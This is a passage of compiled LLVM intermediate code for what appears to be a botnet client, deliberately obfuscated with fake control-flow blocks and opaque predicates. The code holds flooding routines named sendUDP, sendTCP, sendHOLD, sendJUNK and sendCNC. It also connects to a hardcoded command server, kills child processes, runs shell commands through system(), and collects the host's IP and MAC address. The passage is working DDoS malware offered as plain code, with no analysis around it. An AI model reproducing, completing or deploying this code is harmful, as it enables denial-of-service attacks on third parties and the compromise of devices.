  call void @sendHOLD(i8* %1447, i32 %1448, i32 %1449)
  call void @_exit(i32 0) #12
  br label %originalBB26

originalBB30alteredBB:                            ; preds = %originalBB30, %296
  %1450 = load i8*, i8** %7, align 8
  %1451 = load i32, i32* %8, align 4
  %1452 = load i32, i32* %9, align 4
  call void @sendHOLD(i8* %1450, i32 %1451, i32 %1452)
  call void @_exit(i32 0) #12
  br label %originalBB30

originalBB34alteredBB:                            ; preds = %originalBB34, %316
  br label %originalBB34

originalBB38alteredBB:                            ; preds = %originalBB38, %333
  %1453 = load i8**, i8*** %4, align 8
  %1454 = getelementptr inbounds i8*, i8** %1453, i64 0
  %1455 = load i8*, i8** %1454, align 8
  %1456 = call i32 @strcmp(i8* %1455, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.100, i32 0, i32 0)) #10
  %1457 = icmp ne i32 %1456, 0
  br label %originalBB38

originalBB42alteredBB:                            ; preds = %originalBB42, %355
  %1458 = load i32, i32* %3, align 4
  %1459 = icmp slt i32 %1458, 4
  br label %originalBB42

originalBB46alteredBB:                            ; preds = %originalBB46, %380
  %1460 = load i8**, i8*** %4, align 8
  %1461 = getelementptr inbounds i8*, i8** %1460, i64 3
  %1462 = load i8*, i8** %1461, align 8
  %1463 = call i32 @atoi(i8* %1462) #10
  %1464 = icmp slt i32 %1463, 1
  br label %originalBB46

originalBB50alteredBB:                            ; preds = %originalBB50, %427
  %1465 = load i8*, i8** %14, align 8
  %1466 = load i32, i32* %12, align 4
  %1467 = load i32, i32* %13, align 4
  call void @sendJUNK(i8* %1465, i32 %1466, i32 %1467)
  %1468 = load i32, i32* @mainCommSock, align 4
  %1469 = call i32 @close(i32 %1468)
  call void @_exit(i32 0) #12
  br label %originalBB50

originalBB54alteredBB:                            ; preds = %originalBB54, %449
  %1470 = call i8* @strtok(i8* null, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.84, i32 0, i32 0)) #2
  store i8* %1470, i8** %14, align 8
  br label %originalBB54

originalBB58alteredBB:                            ; preds = %originalBB58, %486
  %1471 = load i8**, i8*** %4, align 8
  %1472 = getelementptr inbounds i8*, i8** %1471, i64 3
  %1473 = load i8*, i8** %1472, align 8
  %1474 = call i32 @atoi(i8* %1473) #10
  %1475 = icmp eq i32 %1474, -1
  br label %originalBB58

originalBB62alteredBB:                            ; preds = %originalBB62, %508
  %1476 = load i8**, i8*** %4, align 8
  %1477 = getelementptr inbounds i8*, i8** %1476, i64 2
  %1478 = load i8*, i8** %1477, align 8
  %1479 = call i32 @atoi(i8* %1478) #10
  %1480 = icmp eq i32 %1479, -1
  br label %originalBB62

originalBB66alteredBB:                            ; preds = %originalBB66, %542
  %1481 = load i32, i32* %3, align 4
  %1482 = icmp eq i32 %1481, 6
  br label %originalBB66

originalBB70alteredBB:                            ; preds = %originalBB70, %568
  %1483 = load i8**, i8*** %4, align 8
  %1484 = getelementptr inbounds i8*, i8** %1483, i64 1
  %1485 = load i8*, i8** %1484, align 8
  store i8* %1485, i8** %15, align 8
  %1486 = load i8**, i8*** %4, align 8
  %1487 = getelementptr inbounds i8*, i8** %1486, i64 2
  %1488 = load i8*, i8** %1487, align 8
  %1489 = call i32 @atoi(i8* %1488) #10
  store i32 %1489, i32* %16, align 4
  %1490 = load i8**, i8*** %4, align 8
  %1491 = getelementptr inbounds i8*, i8** %1490, i64 3
  %1492 = load i8*, i8** %1491, align 8
  %1493 = call i32 @atoi(i8* %1492) #10
  store i32 %1493, i32* %17, align 4
  %1494 = load i8**, i8*** %4, align 8
  %1495 = getelementptr inbounds i8*, i8** %1494, i64 4
  %1496 = load i8*, i8** %1495, align 8
  %1497 = call i32 @atoi(i8* %1496) #10
  store i32 %1497, i32* %18, align 4
  %1498 = load i32, i32* %3, align 4
  %1499 = icmp eq i32 %1498, 6
  br label %originalBB70

originalBB74alteredBB:                            ; preds = %originalBB74, %602
  %1500 = load i8**, i8*** %4, align 8
  %1501 = getelementptr inbounds i8*, i8** %1500, i64 5
  %1502 = load i8*, i8** %1501, align 8
  %1503 = call i32 @atoi(i8* %1502) #10
  br label %originalBB74

originalBB78alteredBB:                            ; preds = %originalBB78, %623
  br label %originalBB78

originalBB82alteredBB:                            ; preds = %originalBB82, %654
  %1504 = load i8*, i8** %21, align 8
  %1505 = load i32, i32* %16, align 4
  %1506 = load i32, i32* %17, align 4
  %1507 = load i32, i32* %18, align 4
  %1508 = load i32, i32* %19, align 4
  %1509 = load i32, i32* %20, align 4
  call void @sendUDP(i8* %1504, i32 %1505, i32 %1506, i32 %1507, i32 %1508, i32 %1509)
  call void @_exit(i32 0) #12
  br label %originalBB82

originalBB86alteredBB:                            ; preds = %originalBB86, %707
  %1510 = load i8**, i8*** %4, align 8
  %1511 = getelementptr inbounds i8*, i8** %1510, i64 5
  %1512 = load i8*, i8** %1511, align 8
  %1513 = call i32 @atoi(i8* %1512) #10
  %1514 = icmp slt i32 %1513, 1
  br label %originalBB86

originalBB90alteredBB:                            ; preds = %originalBB90, %733
  br label %originalBB90

originalBB94alteredBB:                            ; preds = %originalBB94, %779
  %1515 = load i32, i32* %3, align 4
  %1516 = icmp slt i32 %1515, 4
  br label %originalBB94

originalBB98alteredBB:                            ; preds = %originalBB98, %832
  %1517 = call i32 @listFork()
  %1518 = icmp ne i32 %1517, 0
  br label %originalBB98

originalBB102alteredBB:                           ; preds = %originalBB102, %851
  %1519 = load i8*, i8** %25, align 8
  %1520 = load i32, i32* %23, align 4
  %1521 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %1519, i32 %1520, i32 %1521)
  %1522 = load i32, i32* @mainCommSock, align 4
  %1523 = call i32 @close(i32 %1522)
  call void @_exit(i32 0) #12
  br label %originalBB102

originalBB106alteredBB:                           ; preds = %originalBB106, %880
  %1524 = load i8*, i8** %22, align 8
  %1525 = load i32, i32* %23, align 4
  %1526 = load i32, i32* %24, align 4
  call void @sendCNC(i8* %1524, i32 %1525, i32 %1526)
  call void @_exit(i32 0) #12
  br label %originalBB106

originalBB110alteredBB:                           ; preds = %originalBB110, %901
  %1527 = load i8**, i8*** %4, align 8
  %1528 = getelementptr inbounds i8*, i8** %1527, i64 0
  %1529 = load i8*, i8** %1528, align 8
  %1530 = call i32 @strcmp(i8* %1529, i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0)) #10
  %1531 = icmp ne i32 %1530, 0
  br label %originalBB110

originalBB114alteredBB:                           ; preds = %originalBB114, %932
  %1532 = load i8**, i8*** %4, align 8
  %1533 = getelementptr inbounds i8*, i8** %1532, i64 3
  %1534 = load i8*, i8** %1533, align 8
  %1535 = call i32 @atoi(i8* %1534) #10
  %1536 = icmp slt i32 %1535, 1
  br label %originalBB114

originalBB118alteredBB:                           ; preds = %originalBB118, %954
  br label %originalBB118

originalBB122alteredBB:                           ; preds = %originalBB122, %1010
  br label %originalBB122

originalBB126alteredBB:                           ; preds = %originalBB126, %1056
  %1537 = load i32, i32* %3, align 4
  %1538 = icmp sgt i32 %1537, 5
  br label %originalBB126

originalBB130alteredBB:                           ; preds = %originalBB130, %1081
  %1539 = load i32, i32* %3, align 4
  %1540 = icmp eq i32 %1539, 7
  br label %originalBB130

originalBB134alteredBB:                           ; preds = %originalBB134, %1100
  %1541 = load i8**, i8*** %4, align 8
  %1542 = getelementptr inbounds i8*, i8** %1541, i64 6
  %1543 = load i8*, i8** %1542, align 8
  %1544 = call i32 @atoi(i8* %1543) #10
  %1545 = icmp slt i32 %1544, 1
  br label %originalBB134

originalBB138alteredBB:                           ; preds = %originalBB138, %1150
  %1546 = load i8**, i8*** %4, align 8
  %1547 = getelementptr inbounds i8*, i8** %1546, i64 5
  %1548 = load i8*, i8** %1547, align 8
  %1549 = call i32 @atoi(i8* %1548) #10
  br label %originalBB138

originalBB142alteredBB:                           ; preds = %originalBB142, %1180
  %1550 = load i8*, i8** %37, align 8
  %1551 = icmp ne i8* %1550, null
  br label %originalBB142

originalBB146alteredBB:                           ; preds = %originalBB146, %1202
  %1552 = load i8*, i8** %37, align 8
  %1553 = load i32, i32* %31, align 4
  %1554 = load i32, i32* %32, align 4
  %1555 = load i8*, i8** %33, align 8
  %1556 = load i32, i32* %35, align 4
  %1557 = load i32, i32* %34, align 4
  %1558 = load i32, i32* %36, align 4
  call void @sendTCP(i8* %1552, i32 %1553, i32 %1554, i8* %1555, i32 %1556, i32 %1557, i32 %1558)
  call void @_exit(i32 0) #12
  br label %originalBB146

originalBB150alteredBB:                           ; preds = %originalBB150, %1228
  br label %originalBB150

originalBB154alteredBB:                           ; preds = %originalBB154, %1245
  %1559 = call i32 @listFork()
  %1560 = icmp ne i32 %1559, 0
  br label %originalBB154

originalBB158alteredBB:                           ; preds = %originalBB158, %1280
  store i32 0, i32* %38, align 4
  store i64 0, i64* %39, align 8
  br label %originalBB158

originalBB162alteredBB:                           ; preds = %originalBB162, %1297
  %1561 = load i64, i64* %39, align 8
  %1562 = load i64, i64* @numpids, align 8
  %1563 = icmp ult i64 %1561, %1562
  br label %originalBB162

originalBB166alteredBB:                           ; preds = %originalBB166, %1330
  %1564 = load i32*, i32** @pids, align 8
  %1565 = load i64, i64* %39, align 8
  %1566 = getelementptr inbounds i32, i32* %1564, i64 %1565
  %1567 = load i32, i32* %1566, align 4
  %1568 = call i32 @kill(i32 %1567, i32 9) #2
  %1569 = load i32, i32* %38, align 4
  %_ = shl i32 %1569, 1
  %_167 = sub i32 0, %1569
  %gen = add i32 %_167, 1
  %_168 = sub i32 %1569, 1
  %gen169 = mul i32 %_168, 1
  %_170 = shl i32 %1569, 1
  %_171 = shl i32 %1569, 1
  %1570 = add nsw i32 %1569, 1
  store i32 %1570, i32* %38, align 4
  br label %originalBB166

originalBB175alteredBB:                           ; preds = %originalBB175, %1365
  call void @exit(i32 0) #14
  br label %originalBB175

originalBB179alteredBB:                           ; preds = %originalBB179, %1388
  %1571 = call i32 @system(i8* getelementptr inbounds ([21 x i8], [21 x i8]* @.str.109, i32 0, i32 0))
  %1572 = call i32 @system(i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0))
  %1573 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.111, i32 0, i32 0))
  %1574 = call i32 @system(i8* getelementptr inbounds ([23 x i8], [23 x i8]* @.str.112, i32 0, i32 0))
  %1575 = call i32 @system(i8* getelementptr inbounds ([20 x i8], [20 x i8]* @.str.113, i32 0, i32 0))
  %1576 = call i32 @system(i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.114, i32 0, i32 0))
  %1577 = call i32 @system(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.115, i32 0, i32 0))
  %1578 = call i32 @system(i8* getelementptr inbounds ([22 x i8], [22 x i8]* @.str.116, i32 0, i32 0))
  br label %originalBB179

originalBB183alteredBB:                           ; preds = %originalBB183, %1413
  br label %originalBB183
}

; Function Attrs: nounwind
declare i32 @kill(i32, i32) #4

; Function Attrs: nounwind readonly
declare i32 @atoi(i8*) #1

; Function Attrs: nounwind
declare i32 @getpid() #4

; Function Attrs: noinline nounwind uwtable
define i32 @initConnection() #0 {
  %1 = load i32, i32* @x.81
  %2 = load i32, i32* @y.82
  %3 = sub i32 %1, 1
  %4 = mul i32 %1, %3
  %5 = urem i32 %4, 2
  %6 = icmp eq i32 %5, 0
  %7 = icmp slt i32 %2, 10
  %8 = or i1 %6, %7
  br i1 %8, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %0
  %9 = alloca i32, align 4
  %10 = alloca [4096 x i8], align 16
  %11 = alloca i32, align 4
  %12 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %12, i8 0, i64 4096, i32 16, i1 false)
  %13 = load i32, i32* @mainCommSock, align 4
  %14 = icmp ne i32 %13, 0
  %15 = load i32, i32* @x.81
  %16 = load i32, i32* @y.82
  %17 = sub i32 %15, 1
  %18 = mul i32 %15, %17
  %19 = urem i32 %18, 2
  %20 = icmp eq i32 %19, 0
  %21 = icmp slt i32 %16, 10
  %22 = or i1 %20, %21
  br i1 %22, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %14, label %23, label %42

; <label>:23:                                     ; preds = %originalBBpart2
  %24 = load i32, i32* @x.81
  %25 = load i32, i32* @y.82
  %26 = sub i32 %24, 1
  %27 = mul i32 %24, %26
  %28 = urem i32 %27, 2
  %29 = icmp eq i32 %28, 0
  %30 = icmp slt i32 %25, 10
  %31 = or i1 %29, %30
  br i1 %31, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %23
  %32 = load i32, i32* @mainCommSock, align 4
  %33 = call i32 @close(i32 %32)
  store i32 0, i32* @mainCommSock, align 4
  %34 = load i32, i32* @x.81
  %35 = load i32, i32* @y.82
  %36 = sub i32 %34, 1
  %37 = mul i32 %34, %36
  %38 = urem i32 %37, 2
  %39 = icmp eq i32 %38, 0
  %40 = icmp slt i32 %35, 10
  %41 = or i1 %39, %40
  br i1 %41, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br label %42

; <label>:42:                                     ; preds = %originalBBpart24, %originalBBpart2
  %43 = load i32, i32* @x.81
  %44 = load i32, i32* @y.82
  %45 = sub i32 %43, 1
  %46 = mul i32 %43, %45
  %47 = urem i32 %46, 2
  %48 = icmp eq i32 %47, 0
  %49 = icmp slt i32 %44, 10
  %50 = or i1 %48, %49
  br i1 %50, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %42
  %51 = load i32, i32* @currentServer, align 4
  %52 = add nsw i32 %51, 1
  %53 = sext i32 %52 to i64
  %54 = icmp eq i64 %53, 1
  %55 = load i32, i32* @x.81
  %56 = load i32, i32* @y.82
  %57 = sub i32 %55, 1
  %58 = mul i32 %55, %57
  %59 = urem i32 %58, 2
  %60 = icmp eq i32 %59, 0
  %61 = icmp slt i32 %56, 10
  %62 = or i1 %60, %61
  br i1 %62, label %originalBBpart215, label %originalBB6alteredBB

originalBBpart215:                                ; preds = %originalBB6
  br i1 %54, label %63, label %64

; <label>:63:                                     ; preds = %originalBBpart215
  store i32 0, i32* @currentServer, align 4
  br label %67

; <label>:64:                                     ; preds = %originalBBpart215
  %65 = load i32, i32* @currentServer, align 4
  %66 = add nsw i32 %65, 1
  store i32 %66, i32* @currentServer, align 4
  br label %67

; <label>:67:                                     ; preds = %64, %63
  %68 = load i32, i32* @x.81
  %69 = load i32, i32* @y.82
  %70 = sub i32 %68, 1
  %71 = mul i32 %68, %70
  %72 = urem i32 %71, 2
  %73 = icmp eq i32 %72, 0
  %74 = icmp slt i32 %69, 10
  %75 = or i1 %73, %74
  br i1 %75, label %originalBB17, label %originalBB17alteredBB

originalBB17:                                     ; preds = %originalBB17alteredBB, %67
  %76 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %77 = load i32, i32* @currentServer, align 4
  %78 = sext i32 %77 to i64
  %79 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %78
  %80 = load i8*, i8** %79, align 8
  %81 = call i8* @strcpy(i8* %76, i8* %80) #2
  store i32 23, i32* %11, align 4
  %82 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %83 = call i8* @strchr(i8* %82, i32 58) #10
  %84 = icmp ne i8* %83, null
  %85 = load i32, i32* @x.81
  %86 = load i32, i32* @y.82
  %87 = sub i32 %85, 1
  %88 = mul i32 %85, %87
  %89 = urem i32 %88, 2
  %90 = icmp eq i32 %89, 0
  %91 = icmp slt i32 %86, 10
  %92 = or i1 %90, %91
  br i1 %92, label %originalBBpart219, label %originalBB17alteredBB

originalBBpart219:                                ; preds = %originalBB17
  br i1 %84, label %93, label %100

; <label>:93:                                     ; preds = %originalBBpart219
  %94 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %95 = call i8* @strchr(i8* %94, i32 58) #10
  %96 = getelementptr inbounds i8, i8* %95, i64 1
  %97 = call i32 @atoi(i8* %96) #10
  store i32 %97, i32* %11, align 4
  %98 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %99 = call i8* @strchr(i8* %98, i32 58) #10
  store i8 0, i8* %99, align 1
  br label %100

; <label>:100:                                    ; preds = %93, %originalBBpart219
  %101 = call i32 @socket(i32 2, i32 1, i32 0) #2
  store i32 %101, i32* @mainCommSock, align 4
  %102 = load i32, i32* @mainCommSock, align 4
  %103 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %104 = load i32, i32* %11, align 4
  %105 = call i32 @connectTimeout(i32 %102, i8* %103, i32 %104, i32 30)
  %106 = icmp ne i32 %105, 0
  br i1 %106, label %108, label %107

; <label>:107:                                    ; preds = %100
  store i32 1, i32* %9, align 4
  br label %109

; <label>:108:                                    ; preds = %100
  store i32 0, i32* %9, align 4
  br label %109

; <label>:109:                                    ; preds = %108, %107
  %110 = load i32, i32* %9, align 4
  ret i32 %110

originalBBalteredBB:                              ; preds = %originalBB, %0
  %111 = alloca i32, align 4
  %112 = alloca [4096 x i8], align 16
  %113 = alloca i32, align 4
  %114 = getelementptr inbounds [4096 x i8], [4096 x i8]* %112, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %114, i8 0, i64 4096, i32 16, i1 false)
  %115 = load i32, i32* @mainCommSock, align 4
  %116 = icmp ne i32 %115, 0
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %23
  %117 = load i32, i32* @mainCommSock, align 4
  %118 = call i32 @close(i32 %117)
  store i32 0, i32* @mainCommSock, align 4
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %42
  %119 = load i32, i32* @currentServer, align 4
  %_ = shl i32 %119, 1
  %_7 = sub i32 0, %119
  %gen = add i32 %_7, 1
  %_8 = sub i32 %119, 1
  %gen9 = mul i32 %_8, 1
  %_10 = sub i32 0, %119
  %gen11 = add i32 %_10, 1
  %_12 = sub i32 0, %119
  %gen13 = add i32 %_12, 1
  %120 = add nsw i32 %119, 1
  %121 = sext i32 %120 to i64
  %122 = icmp eq i64 %121, 1
  br label %originalBB6

originalBB17alteredBB:                            ; preds = %originalBB17, %67
  %123 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %124 = load i32, i32* @currentServer, align 4
  %125 = sext i32 %124 to i64
  %126 = getelementptr inbounds [1 x i8*], [1 x i8*]* @commServer, i64 0, i64 %125
  %127 = load i8*, i8** %126, align 8
  %128 = call i8* @strcpy(i8* %123, i8* %127) #2
  store i32 23, i32* %11, align 4
  %129 = getelementptr inbounds [4096 x i8], [4096 x i8]* %10, i32 0, i32 0
  %130 = call i8* @strchr(i8* %129, i32 58) #10
  %131 = icmp ne i8* %130, null
  br label %originalBB17
}

; Function Attrs: noinline nounwind uwtable
define i32 @getOurIP() #0 {
  %1 = alloca i32, align 4
  %2 = alloca i32, align 4
  %3 = alloca %struct.sockaddr_in, align 4
  %4 = alloca i32, align 4
  %5 = alloca %struct.sockaddr_in, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca [4096 x i8], align 16
  %9 = alloca i8*, align 8
  %10 = alloca i32, align 4
  %11 = alloca %struct.ifreq, align 8
  %12 = call i32 @socket(i32 2, i32 2, i32 0) #2
  store i32 %12, i32* %2, align 4
  %13 = load i32, i32* %2, align 4
  %14 = icmp eq i32 %13, -1
  br i1 %14, label %15, label %16

; <label>:15:                                     ; preds = %0
  store i32 0, i32* %1, align 4
  br label %197

; <label>:16:                                     ; preds = %0
  %17 = load i32, i32* @x.83
  %18 = load i32, i32* @y.84
  %19 = sub i32 %17, 1
  %20 = mul i32 %17, %19
  %21 = urem i32 %20, 2
  %22 = icmp eq i32 %21, 0
  %23 = icmp slt i32 %18, 10
  %24 = or i1 %22, %23
  br i1 %24, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %16
  %25 = bitcast %struct.sockaddr_in* %3 to i8*
  call void @llvm.memset.p0i8.i64(i8* %25, i8 0, i64 16, i32 4, i1 false)
  %26 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 0
  store i16 2, i16* %26, align 4
  %27 = call i32 @inet_addr(i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.117, i32 0, i32 0)) #2
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 2
  %29 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %28, i32 0, i32 0
  store i32 %27, i32* %29, align 4
  %30 = call zeroext i16 @htons(i16 zeroext 53) #13
  %31 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %3, i32 0, i32 1
  store i16 %30, i16* %31, align 2
  %32 = load i32, i32* %2, align 4
  %33 = bitcast %struct.sockaddr_in* %3 to %struct.sockaddr*
  %34 = call i32 @connect(i32 %32, %struct.sockaddr* %33, i32 16)
  store i32 %34, i32* %4, align 4
  %35 = load i32, i32* %4, align 4
  %36 = icmp eq i32 %35, -1
  %37 = load i32, i32* @x.83
  %38 = load i32, i32* @y.84
  %39 = sub i32 %37, 1
  %40 = mul i32 %37, %39
  %41 = urem i32 %40, 2
  %42 = icmp eq i32 %41, 0
  %43 = icmp slt i32 %38, 10
  %44 = or i1 %42, %43
  br i1 %44, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %36, label %45, label %46

; <label>:45:                                     ; preds = %originalBBpart2
  store i32 0, i32* %1, align 4
  br label %197

; <label>:46:                                     ; preds = %originalBBpart2
  store i32 16, i32* %6, align 4
  %47 = load i32, i32* %2, align 4
  %48 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %49 = call i32 @getsockname(i32 %47, %struct.sockaddr* %48, i32* %6) #2
  store i32 %49, i32* %4, align 4
  %50 = load i32, i32* %4, align 4
  %51 = icmp eq i32 %50, -1
  br i1 %51, label %52, label %53

; <label>:52:                                     ; preds = %46
  store i32 0, i32* %1, align 4
  br label %197

; <label>:53:                                     ; preds = %46
  %54 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i32 0, i32 2
  %55 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %54, i32 0, i32 0
  %56 = load i32, i32* %55, align 4
  store i32 %56, i32* getelementptr inbounds (%struct.in_addr, %struct.in_addr* @ourIP, i32 0, i32 0), align 4
  %57 = call i32 (i8*, i32, ...) @open(i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.118, i32 0, i32 0), i32 0)
  store i32 %57, i32* %7, align 4
  br label %58

; <label>:58:                                     ; preds = %127, %53
  %59 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %60 = load i32, i32* %7, align 4
  %61 = call i8* @fdgets(i8* %59, i32 4096, i32 %60)
  %62 = icmp ne i8* %61, null
  br i1 %62, label %63, label %129

; <label>:63:                                     ; preds = %58
  %64 = load i32, i32* @x.83
  %65 = load i32, i32* @y.84
  %66 = sub i32 %64, 1
  %67 = mul i32 %64, %66
  %68 = urem i32 %67, 2
  %69 = icmp eq i32 %68, 0
  %70 = icmp slt i32 %65, 10
  %71 = or i1 %69, %70
  br i1 %71, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %63
  %72 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %73 = call i8* @strstr(i8* %72, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0)) #10
  %74 = icmp ne i8* %73, null
  %75 = load i32, i32* @x.83
  %76 = load i32, i32* @y.84
  %77 = sub i32 %75, 1
  %78 = mul i32 %75, %77
  %79 = urem i32 %78, 2
  %80 = icmp eq i32 %79, 0
  %81 = icmp slt i32 %76, 10
  %82 = or i1 %80, %81
  br i1 %82, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %74, label %83, label %127

; <label>:83:                                     ; preds = %originalBBpart24
  %84 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  store i8* %84, i8** %9, align 8
  br label %85

; <label>:85:                                     ; preds = %originalBBpart28, %83
  %86 = load i8*, i8** %9, align 8
  %87 = load i8, i8* %86, align 1
  %88 = zext i8 %87 to i32
  %89 = icmp ne i32 %88, 9
  br i1 %89, label %90, label %109

; <label>:90:                                     ; preds = %85
  %91 = load i32, i32* @x.83
  %92 = load i32, i32* @y.84
  %93 = sub i32 %91, 1
  %94 = mul i32 %91, %93
  %95 = urem i32 %94, 2
  %96 = icmp eq i32 %95, 0
  %97 = icmp slt i32 %92, 10
  %98 = or i1 %96, %97
  br i1 %98, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %90
  %99 = load i8*, i8** %9, align 8
  %100 = getelementptr inbounds i8, i8* %99, i32 1
  store i8* %100, i8** %9, align 8
  %101 = load i32, i32* @x.83
  %102 = load i32, i32* @y.84
  %103 = sub i32 %101, 1
  %104 = mul i32 %101, %103
  %105 = urem i32 %104, 2
  %106 = icmp eq i32 %105, 0
  %107 = icmp slt i32 %102, 10
  %108 = or i1 %106, %107
  br i1 %108, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br label %85

; <label>:109:                                    ; preds = %85
  %110 = load i32, i32* @x.83
  %111 = load i32, i32* @y.84
  %112 = sub i32 %110, 1
  %113 = mul i32 %110, %112
  %114 = urem i32 %113, 2
  %115 = icmp eq i32 %114, 0
  %116 = icmp slt i32 %111, 10
  %117 = or i1 %115, %116
  br i1 %117, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %109
  %118 = load i8*, i8** %9, align 8
  store i8 0, i8* %118, align 1
  %119 = load i32, i32* @x.83
  %120 = load i32, i32* @y.84
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %129

; <label>:127:                                    ; preds = %originalBBpart24
  %128 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  call void @llvm.memset.p0i8.i64(i8* %128, i8 0, i64 4096, i32 16, i1 false)
  br label %58

; <label>:129:                                    ; preds = %originalBBpart212, %58
  %130 = load i32, i32* %7, align 4
  %131 = call i32 @close(i32 %130)
  %132 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %133 = load i8, i8* %132, align 16
  %134 = icmp ne i8 %133, 0
  br i1 %134, label %135, label %194

; <label>:135:                                    ; preds = %129
  %136 = load i32, i32* @x.83
  %137 = load i32, i32* @y.84
  %138 = sub i32 %136, 1
  %139 = mul i32 %136, %138
  %140 = urem i32 %139, 2
  %141 = icmp eq i32 %140, 0
  %142 = icmp slt i32 %137, 10
  %143 = or i1 %141, %142
  br i1 %143, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %135
  %144 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 0
  %145 = bitcast %union.anon.6* %144 to [16 x i8]*
  %146 = getelementptr inbounds [16 x i8], [16 x i8]* %145, i32 0, i32 0
  %147 = getelementptr inbounds [4096 x i8], [4096 x i8]* %8, i32 0, i32 0
  %148 = call i8* @strcpy(i8* %146, i8* %147) #2
  %149 = load i32, i32* %2, align 4
  %150 = call i32 (i32, i64, ...) @ioctl(i32 %149, i64 35111, %struct.ifreq* %11) #2
  store i32 0, i32* %10, align 4
  %151 = load i32, i32* @x.83
  %152 = load i32, i32* @y.84
  %153 = sub i32 %151, 1
  %154 = mul i32 %151, %153
  %155 = urem i32 %154, 2
  %156 = icmp eq i32 %155, 0
  %157 = icmp slt i32 %152, 10
  %158 = or i1 %156, %157
  br i1 %158, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %159

; <label>:159:                                    ; preds = %190, %originalBBpart216
  %160 = load i32, i32* %10, align 4
  %161 = icmp slt i32 %160, 6
  br i1 %161, label %162, label %193

; <label>:162:                                    ; preds = %159
  %163 = load i32, i32* @x.83
  %164 = load i32, i32* @y.84
  %165 = sub i32 %163, 1
  %166 = mul i32 %163, %165
  %167 = urem i32 %166, 2
  %168 = icmp eq i32 %167, 0
  %169 = icmp slt i32 %164, 10
  %170 = or i1 %168, %169
  br i1 %170, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %162
  %171 = getelementptr inbounds %struct.ifreq, %struct.ifreq* %11, i32 0, i32 1
  %172 = bitcast %union.anon.7* %171 to %struct.sockaddr*
  %173 = getelementptr inbounds %struct.sockaddr, %struct.sockaddr* %172, i32 0, i32 1
  %174 = getelementptr inbounds [14 x i8], [14 x i8]* %173, i32 0, i32 0
  %175 = load i32, i32* %10, align 4
  %176 = sext i32 %175 to i64
  %177 = getelementptr inbounds i8, i8* %174, i64 %176
  %178 = load i8, i8* %177, align 1
  %179 = load i32, i32* %10, align 4
  %180 = sext i32 %179 to i64
  %181 = getelementptr inbounds [6 x i8], [6 x i8]* @macAddress, i64 0, i64 %180
  store i8 %178, i8* %181, align 1
  %182 = load i32, i32* @x.83
  %183 = load i32, i32* @y.84
